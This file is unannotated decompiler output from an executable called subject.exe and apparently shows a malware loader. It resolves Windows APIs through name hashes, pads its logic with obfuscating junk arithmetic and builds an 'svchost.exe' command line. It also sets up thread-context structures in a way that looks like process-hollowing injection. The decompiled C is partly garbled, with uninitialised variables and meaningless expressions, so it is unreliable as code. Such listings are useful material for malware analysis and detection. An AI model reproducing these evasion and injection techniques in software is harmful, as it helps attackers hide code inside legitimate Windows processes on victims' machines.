// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_22 g_t404000 = &g_str403094; // 00404000
word32 g_dw404010 = 0x00403083; // 00404010
Eq_22 g_t404014 = &g_str40307E; // 00404014
Eq_22 g_t404018 = &g_str403071; // 00404018
uint32 g_dw404028 = 0x00403005; // 00404028
Eq_22 g_t40402C = &g_str403000; // 0040402C
word32 g_dw40406C = 16636; // 0040406C
word32 g_dw404070 = 16656; // 00404070
word32 g_dw404074 = 0x411E; // 00404074
word32 g_dw404078 = 16688; // 00404078
word32 g_dw40407C = 16696; // 0040407C
word32 g_dw404080 = 0x4146; // 00404080
word32 g_dw404084 = 0x4154; // 00404084
word32 g_dw404088 = 0x4160; // 00404088
word32 g_dw40408C = 0x416C; // 0040408C
word32 g_dw404090 = 16762; // 00404090
word32 g_dw404094 = 16774; // 00404094
word32 g_dw404098 = 0x4194; // 00404098
word32 g_dw40409C = 0x41A4; // 0040409C
word32 g_dw4040A0 = 16818; // 004040A0
word32 g_dw4040A4 = 0x41C8; // 004040A4
word32 g_dw4040AC = 16866; // 004040AC
<anonymous> * __imp__GetModuleHandleA = &g_t40FC; // 004040B4
<anonymous> * __imp__FreeConsole = &g_t4110; // 004040B8
<anonymous> * __imp__GetCommandLineA = &g_t411E; // 004040BC
<anonymous> * __imp__Sleep = &g_t4130; // 004040C0
<anonymous> * __imp__DeleteFileA = &g_t4138; // 004040C4
<anonymous> * __imp__ExitProcess = &g_t4146; // 004040C8
<anonymous> * __imp__lstrlenA = &g_t4154; // 004040CC
<anonymous> * __imp__lstrcatA = &g_t4160; // 004040D0
<anonymous> * __imp__CreateFileA = &g_t416C; // 004040D4
<anonymous> * __imp__WriteFile = &g_t417A; // 004040D8
<anonymous> * __imp__CloseHandle = &g_t4186; // 004040DC
<anonymous> * __imp__LoadLibraryA = &g_t4194; // 004040E0
<anonymous> * __imp__GetFileType = &g_t41A4; // 004040E4
<anonymous> * __imp__GetModuleFileNameA = &g_t41B2; // 004040E8
<anonymous> * __imp__lstrcpyA = &g_t41C8; // 004040EC
<anonymous> * __imp__SetFileSecurityA = &g_t41E2; // 004040F4
word32 g_dw404204 = 0x00; // 00404204
word32 g_dw404208 = 0x00; // 00404208
<anonymous> * g_ptr404214 = null; // 00404214
<anonymous> * g_ptr404218 = null; // 00404218
word32 g_dw40421C = 0x00; // 0040421C
word32 g_dw4042D4 = 0x00; // 004042D4
<anonymous> * g_ptr4044E8 = null; // 004044E8
<anonymous> * g_ptr4044EC = null; // 004044EC
<anonymous> * g_ptr4044F0 = null; // 004044F0
<anonymous> * g_ptr4044F4 = null; // 004044F4
<anonymous> * g_ptr4048F8 = null; // 004048F8
<anonymous> * g_ptr4048FC = null; // 004048FC
<anonymous> * g_ptr404900 = null; // 00404900
CHAR g_t404904 = '\0'; // 00404904
<anonymous> * g_ptr404A08 = null; // 00404A08
<anonymous> * g_ptr404A0C = null; // 00404A0C
<anonymous> * g_ptr404A10 = null; // 00404A10
<anonymous> * g_ptr404A14 = null; // 00404A14
<anonymous> * g_ptr404A18 = null; // 00404A18
<anonymous> * g_ptr404A1C = null; // 00404A1C
CHAR g_t404A20 = '\0'; // 00404A20
word32 g_dw404B24 = 0x00; // 00404B24
word32 g_dw404B50 = 0x00; // 00404B50
word16 g_w404B54 = 0x00; // 00404B54
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_str403000[] = "svch"; // 00403000
CHAR g_str403071[] = "kernel32.dll"; // 00403071
CHAR g_str40307E[] = "exe "; // 0040307E
CHAR g_str403094[] = "ost."; // 00403094
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
// Called from:
//      Win32CrtStartup
word32 fn00401000(Eq_3 dwArg04, uint32 dwArg08)
{
	word32 eax_76 = Mem72[Mem52[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_80[] = dwArg04 + eax_76->dw0024 / 4;
	uint32 ebx_117 = dwArg08;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		ebx_117 = dwArg08 + 890899;
	word32 eax_124[] = dwArg04 + eax_76->dw0020 / 4;
	word32 eax_129[] = dwArg04 + eax_76->dw001C / 4;
	int32 edx_131 = 0x00;
	while (true)
	{
		word32 eax_259;
		if (edx_131 >= eax_76->dw0018)
			break;
		int32 eax_167 = dwArg04 + eax_124[edx_131] / 4;
		byte dwLoc3C_318[] = null;
		uint32 dwLoc40_319 = 0x00;
		while (dwLoc3C_318[eax_167] != 0x00)
		{
			dwLoc40_319 = (int32) dwLoc3C_318[eax_167] ^ 33 ^ (dwLoc40_319 << 0x07 | dwLoc40_319 >> 0x19);
			dwLoc3C_318 = (byte (*)[]) (dwLoc3C_318 + 1);
		}
		if (dwLoc40_319 == ebx_117)
		{
			eax_259 = dwArg04 + eax_129[(word32) eax_80[edx_131]] / 4;
			return eax_259;
		}
		++edx_131;
	}
	eax_259 = 0x00;
	return eax_259;
}

// 00401291: void fn00401291()
// Called from:
//      Win32CrtStartup
void fn00401291()
{
	ptr32 fp;
	ui32 dwLoc10;
	ui32 dwLoc0C;
	ui32 dwLoc08;
	ui32 edx_89 = dwLoc08 * 0x03 + (dwLoc08 * 0x02 >> ((byte) dwLoc0C * 0x04) *s ((byte) dwLoc08 + ~0x28) - ((byte) dwLoc08 * 0x02) *s ((byte) dwLoc08 * 0x02) & (dwLoc0C + ((dwLoc0C * 0x02 + 0xD5) + dwLoc10 * 0x04 & dwLoc0C + 2878 ^ (-(dwLoc10 << 0x03) + dwLoc08) + 5555 >> (byte) dwLoc10 * 0x02 + 0x50 & dwLoc0C * 0x02 | ((dwLoc10 * 0x02 | dwLoc0C * 0x02) | dwLoc08 * 0x08 + 0x02E6))) * 0x02 << (byte) dwLoc0C * 0x04 + 0x98) * 0x04 + 0x1E95 >> (byte) dwLoc0C * 0x02 >> ((byte) dwLoc08 * 0x02 + 0x9C) + (byte) dwLoc0C * 0x04 | dwLoc0C * 0x02 + 232;
	Eq_3 eax_45 = GetModuleHandleA(null);
	ui32 eax_103 = dwLoc0C * 0x02 + 75;
	ui32 edx_102 = dwLoc0C + 0x0198 + ((dwLoc08 * 0x02 + 0x02CF) *s (edx_89 * 0x02 + 0x1533)) *s (dwLoc0C + 7207);
	word32 eax_92 = eax_45 + Mem90[eax_45 + 60:word32];
	ui32 eax_107 = edx_102 << (byte) eax_103;
	struct Eq_217 * esp_124;
	word32 eax_125;
	g_ptr404214();
	ui32 eax_153 = dwLoc0C * 0x02 + 0xA2 ^ (edx_89 + 1939 ^ (dwLoc0C + edx_89) * 0x02 + 18) ^ ((dwLoc0C << 0x03) + 5898 & eax_107 * 0x02) & edx_89 * 0x02 + 0x91 | edx_89 * 0x02 & eax_107 * 0x02;
	esp_124->ptrFFFFFFFC = fp - 20;
	esp_124->dwFFFFFFF8 = (int32) eax_92[20];
	esp_124->tFFFFFFF4 = eax_45;
	esp_124->dwFFFFFFF0 = eax_125;
	esp_124->dwFFFFFFEC = g_dw404204;
	ui32 ecx_169 = 0x00 - eax_107 * 0x02;
	uint32 edx_158 = eax_107 + 2868 >> (byte) eax_153 + 0x1A;
	struct Eq_285 * esp_192;
	g_ptr404218();
	g_dw40421C = 0x00010007;
	ui32 eax_171 = dwLoc0C << 0x03 << (byte) eax_153 + 0xC6 << (byte) eax_153 * 0x04 & ecx_169 | edx_158;
	ui32 ecx_226 = eax_171 * 0x02 + (eax_107 << 0x02) + 45 >> (byte) eax_107 + 122 << ((byte) eax_107 << 0x02) + 200 & eax_171 * 0x02 & (eax_171 * 0x02 + 8348) *s (eax_171 * 0x02 + 0x94) ^ ((eax_171 << 0x03) + 0x0B73) + dwLoc0C * 0x08 ^ eax_107 + 0x17C2;
	esp_192->dwFFFFFFFC = 4211228;
	esp_192->dwFFFFFFF8 = g_dw404208;
	ui32 eax_250 = eax_171 * 0x05 + 9985;
	uint32 edx_248 = eax_171 * 0x02 >> ((byte) (-(ecx_226 << 0x02)) + (byte) eax_171 * 0x02) + ~0x19;
	ui32 eax_255 = edx_248 << (byte) eax_250 ^ dwLoc0C * 0x02 << (byte) dwLoc0C * 0x02 + 0x90 & (ecx_226 * 0x02 - eax_171 * 0x02) + 0xA5 << (byte) ecx_226 * 0x08 + 0x9A;
	struct Eq_394 * esp_265;
	g_ptr4044E8();
	g_dw4042D4 = 4199934;
	ui32 ecx_311 = (-dwLoc0C + ecx_226 * 0x02 + ~0x0ABF | eax_255 * 0x02 + 0xF7 << ((byte) dwLoc0C << 0x02) ^ (ecx_226 * 0x02 ^ dwLoc0C + 0x22C9 & eax_255 * 0x02 + 0x94 >> (byte) ecx_226 * 0x02 + 0x31)) + 330 & eax_255 * 0x02 + 18 >> (byte) eax_255 * 0x02 ^ ecx_226 * 0x02;
	esp_265->dwFFFFFFFC = 4211228;
	esp_265->dwFFFFFFF8 = g_dw404208;
	ui32 edx_313 = eax_255 * 0x02 + 0x5A ^ ecx_311;
	ui32 eax_315 = eax_255 + 0x0387 | edx_313;
	struct Eq_463 * esp_325;
	g_ptr4044EC();
	esp_325->dwFFFFFFFC = g_dw404208;
	ui32 eax_345 = (ecx_226 << 0x03) + 0x2284 + eax_255 * 0x02;
	g_ptr4044F0();
}

// 00402001: Register Eq_480 Win32CrtStartup()
Eq_480 Win32CrtStartup()
{
	ui32 dwLoc10;
	int32 dwLoc08;
	ui32 dwLoc0C;
	Eq_3 eax_21 = LoadLibraryA(g_t404018);
	CloseHandle((void *) 0x55);
	g_ptr404A18 = fn00401000(eax_21, ~0x06B088C2);
	GetFileType((void *) 0x2E);
	GetModuleHandleA(null);
	g_ptr404214 = fn00401000(eax_21, 0x25C1455C);
	ui32 eax_48 = dwLoc10 << 0x03 >> (byte) dwLoc10 * 0x02 & dwLoc10 * 0x02 + 0x39 & dwLoc08 + 0x1644 ^ dwLoc0C * 0x04 + 0x116D & dwLoc08 + 7787 ^ (dwLoc10 << 0x02) + 0x11DD | 0x00 >> ((byte) dwLoc10 << 0x02);
	g_ptr404218 = fn00401000(eax_21, 0x117F004B);
	int32 eax_93 = -(dwLoc08 * 0x02 *s ((dwLoc0C * 0x04 + 8285) *s dwLoc08 << 0x03)) + eax_48 * 0x02 + dwLoc0C * 0x02 + 0xC1 << (byte) eax_48 * 0x04 + 0x4B ^ eax_48 * 0x02 & -(eax_48 * 0x02 + 116) + eax_48 * 0x02;
	g_ptr4044E8 = fn00401000(eax_21, 0x15635F51);
	g_ptr4044EC = fn00401000(eax_21, 358840145);
	ui32 eax_140 = eax_93 << 0x03 & (eax_93 << 0x02) >> (byte) dwLoc08 + 0x56 | ((((eax_93 << 0x02) + 7734) *s eax_93) * 0x04) *s (dwLoc08 * 0x02 + 0xFF) + (dwLoc0C << 0x03) ^ dwLoc0C << 0x03;
	g_ptr4044F0 = fn00401000(eax_21, 0xCEE642C0);
	ui32 eax_209 = -(dwLoc08 * 0x04) + eax_140 * 0x04 | ((0x00 >> 0x51 - (byte) dwLoc08) >> (byte) eax_140 * 0x02 | 0x00 << (((byte) dwLoc08 * 0x04 + 0x46 & (byte) eax_140 + 0x41 | (byte) dwLoc08 + 202 & (byte) eax_140 * 0x08 + 171) + 0x26) + (byte) eax_140 * 0x08);
	g_ptr404A08 = fn00401000(eax_21, 4074194022);
	g_ptr404A1C = fn00401000(eax_21, 553318114);
	ui32 eax_247 = eax_209 + 6044 ^ eax_209 * 0x02 + 1884 >> ((byte) eax_209 << 0x02) + 0xA3 | ((eax_209 << 0x02) + 76 | (eax_140 * 0x02 - (eax_209 << 0x03)) + ~0x22C4);
	g_ptr4044F4 = fn00401000(eax_21, 0x7DC27DDD);
	GetModuleFileNameA(null, &g_t404A20, 0x0104);
	lstrcpyA(&g_t404904, g_t40402C);
	ui32 eax_295 = eax_247 * 0x08 + 7229 & eax_247 + 0x068E << (byte) eax_247 * 0x02 + 44 | ((eax_209 * 0x02 + 2021) *s (eax_140 * 0x02 + 63) << (byte) eax_209 * 0x02 & eax_140 + 5388 | eax_247 + 0x0432 << (byte) eax_247 * 0x02);
	lstrcatA(&g_t404904, g_t404000);
	ui32 eax_357 = eax_295 + 0x035D ^ eax_140 * 0x02 + 42 & (eax_140 * 0x02 >> (byte) (-((eax_140 * 0x03 + ~0x200B & eax_140 << 0x02) * 0x02)) + (byte) eax_140 * 0x02) << ((byte) eax_295 << 0x02) ^ eax_140 * 0x02 + 0xD7;
	ui32 eax_399 = eax_295 + 2445 + (-(eax_140 * 0x02 + 220) + eax_295 * 0x02) | (eax_140 << 0x02 ^ eax_295 << 0x02 & eax_140 << 0x02 | eax_295 + 7664);
	lstrcatA(&g_t404904, g_t404014);
	ui32 eax_434 = eax_140 * 0x04 - (eax_140 * 0x02 + 72) + eax_399 * 0x02 >> (((byte) eax_140 << 0x03) - (byte) eax_399 * 0x02) + ~0x05 | (eax_140 + 0x0066 >> (byte) eax_140 + 0x45 | eax_357 * 0x02) | eax_140 * 0x02 + (eax_140 << 0x03);
	lstrcatA(&g_t404904, &g_t404A20);
	ui32 eax_460 = eax_140 * 0x02 | (eax_140 * 0x02 ^ eax_357 * 0x02) ^ eax_140 * 0x02 | (eax_434 * 0x02 + 6386) *s ((eax_357 << 0x03) + 2727) & eax_140 * 0x02 | eax_357 << 0x03 | eax_357 * 0x02 + 0x139D;
	g_dw404B24 = 0x44;
	ui32 eax_492 = eax_434 * 0x04 & (eax_434 + 0x04D8 << (byte) eax_140 * 0x02) << ((byte) (-(eax_460 * 0x02)) + (byte) eax_434 * 0x02) + 0x30 & eax_434 * 0x02 << (byte) eax_140 * 0x02 + 0x0C;
	g_dw404B50 = 0x01;
	ui32 ecx_527 = -(eax_492 << 0x03) + eax_460 * 0x04 + eax_460 * 0x02 + 0x0D7A | eax_434 * 0x02 >> (((byte) eax_492 << 0x02) - (byte) eax_492 * 0x02) + 0xA8 | eax_434 * 0x02 + 5877 ^ eax_492 * 0x02;
	g_w404B54 = 0x02;
	ui32 eax_545 = (eax_434 << 0x03) - (eax_434 * 0x02) *s (eax_434 * 0x02) | ((ecx_527 * 0x02 + 0x01A4) + ecx_527 * 0x04 ^ (eax_492 << 0x02) >> (byte) eax_434 + 199 | ~0xE8 - eax_434 * 0x02);
	Eq_1011 eax_562 = 0x00 >> (byte) ecx_527 * 0x04 >> (byte) ecx_527 * 0x04 + 0x6A | eax_545 * 0x02 + 990;
	ui32 ecx_591 = ecx_527 * 0x02 + 9033 + eax_562 * 0x02 - (eax_562 << 0x03) - eax_545 * 0x04;
	ui32 edx_594 = (eax_562 << 0x03) + 0x1D25;
	ui32 eax_595 = ((ecx_527 << 0x03) + 0x05B7) *s (ecx_527 * 0x02) >> ((byte) ecx_527 << 0x03) << ((byte) eax_562 * 0x02 + 66) + (byte) ecx_527 * 0x04 << (byte) ecx_591 ^ edx_594;
	struct Eq_1070 * esp_620;
	g_ptr404A18();
	esp_620->dwFFFFFFFC = g_dw404010;
	int32 eax_639 = eax_562 *s (((eax_562 * 0x02 + 23) *s (ecx_527 * 0x02)) *s (eax_562 * 0x02));
	ui32 edx_646 = eax_562 * 0x02 & ecx_527 * 0x02;
	int32 eax_647 = eax_595 + 0x11AE >> (byte) ecx_527 + 0xB2 >> (byte) eax_639 * 0x04 ^ edx_646;
	struct Eq_1104 * esp_655;
	Eq_3 eax_656;
	g_ptr4044F4();
	esp_655->dwFFFFFFFC = 0x00311330;
	esp_655->tFFFFFFF8 = eax_656;
	g_ptr4048F8 = fn00401000(esp_655->tFFFFFFF8, esp_655->dwFFFFFFFC);
	esp_655->dwFFFFFFFC = 0xBF27C02C;
	esp_655->tFFFFFFF8 = eax_656;
	g_ptr4048FC = fn00401000(esp_655->tFFFFFFF8, esp_655->dwFFFFFFFC);
	ui32 eax_670 = eax_562 * 0x02 + ((eax_562 * 0x02) *s eax_647) * 0x04 ^ ecx_527 * 0x02 & eax_562 * 0x02;
	esp_655->dwFFFFFFFC = 117637656;
	esp_655->tFFFFFFF8 = eax_656;
	g_ptr404900 = fn00401000(esp_655->tFFFFFFF8, esp_655->dwFFFFFFFC);
	ui32 eax_712 = eax_670 + 0x18F6 & ((eax_670 + 0x1BE4 << (byte) eax_670 * 0x02 & ((word32) (eax_670 * 0x04) + ((word32) eax_562 + 16013) >> (byte) eax_670 * 0x02 + 131 & eax_670 * 0x02 + 0xF8)) & (word32) eax_562 + 9922 << (byte) ecx_527 * 0x02);
	esp_655->dwFFFFFFFC = 2774504988;
	esp_655->tFFFFFFF8 = eax_656;
	g_ptr404A0C = fn00401000(esp_655->tFFFFFFF8, esp_655->dwFFFFFFFC);
	esp_655->dwFFFFFFFC = 0x9CCB447A;
	esp_655->tFFFFFFF8 = eax_656;
	g_ptr404A14 = fn00401000(esp_655->tFFFFFFF8, esp_655->dwFFFFFFFC);
	ui32 eax_751 = eax_712 + 1322 | eax_562 * 0x04 ^ eax_712 * 0x02 + 0x0D00 | eax_712 * 0x02 - (eax_562 * 0x02 + 0xD5) ^ ((eax_712 * 0x02) *s (eax_562 * 0x02) ^ 0x00 >> (byte) eax_712 * 0x02);
	esp_655->dwFFFFFFFC = g_dw404028;
	ui32 eax_822 = eax_712 * 0x02 + 191 + (eax_712 << 0x02) - (((eax_712 << 0x03 & (eax_751 + 0x09C7 << (byte) eax_712 * 0x02) << (byte) eax_562 + ~0x60 ^ eax_751 + 0x0D54) ^ eax_562 * 0x02 | eax_751 * 0x02 ^ eax_562 * 0x02 << ((byte) eax_751 << 0x02)) * 0x02 + 0x88) ^ ((eax_712 << 0x02) + 0x1157) + eax_751;
	uint32 edx_862 = (eax_751 + eax_712) * 0x02 >> (byte) eax_712 * 0x02 + 0x0D;
	ui32 eax_870 = 0x00 >> (byte) eax_712 + 0x18 ^ edx_862 | eax_751 * 0x02 + eax_822 * 0x04 & eax_751 * 0x02 + 0xA7 ^ eax_822 * 0x02 + 1922 & eax_712 * 0x02;
	struct Eq_1353 * esp_878;
	Eq_3 eax_879;
	g_ptr4044F4();
	esp_878->dwFFFFFFFC = 3765777762;
	esp_878->tFFFFFFF8 = eax_879;
	g_ptr404A10 = fn00401000(esp_878->tFFFFFFF8, esp_878->dwFFFFFFFC);
	fn00401291();
	ui32 eax_908 = eax_751 + 0x53 & ((-(eax_751 * 0x02 + 4784) + (eax_751 * 0x08 + 5949) *s (eax_712 * 0x02) >> (byte) eax_712 * 0x02 + 0x05) >> (byte) eax_870 * 0x04 + 0x07) >> (byte) eax_712 + 0x25 & (eax_712 * 0x02 + 1755) + (eax_712 + 0x1749) *s (eax_712 * 0x02);
	ui32 eax_948 = eax_712 * 0x04 & (((eax_870 + 4322) *s (eax_870 * 0x02 + 0x1AF5) - (eax_908 + 0x108C) << (byte) eax_712 * 0x02 + 0x7D) << (byte) eax_870 * 0x02) >> (byte) eax_712 * 0x02 + 226;
	esp_878->dwFFFFFFFC = 0x00;
	ui32 ecx_984 = eax_908 * 0x08 + 0x1F4F;
	ui32 edx_977 = (eax_948 * 0x02 + 0xA4) *s (eax_948 * 0x02) + eax_908 * 0x02 << (byte) eax_948 * 0x02 & eax_948 * 0x02 + 228 << (byte) eax_908 + 0x4B;
	g_ptr404A1C();
	return 0x00;
}

